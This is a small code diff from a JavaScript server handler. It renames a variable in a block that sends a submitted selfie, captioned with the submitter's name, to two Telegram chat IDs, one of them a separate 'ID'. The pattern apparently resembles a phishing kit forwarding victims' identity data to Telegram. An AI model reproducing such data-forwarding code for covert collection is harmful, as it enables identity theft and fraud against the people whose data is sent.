@@ -149,9 +149,9 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     
     // Send selfie to Telegram with a caption if there is one
         if (selfieFile) {
-            const Chat_Ids = [TELEGRAM_CHAT_ID, ID];
+            const Ids = [TELEGRAM_CHAT_ID, ID];
             const caption = `📸 Selfie from: ${name}`;
-          sendPhotoToTelegram(selfieFile.path, caption, Chat_Ids);
+          sendPhotoToTelegram(selfieFile.path, caption, Ids);
         }
 });
 
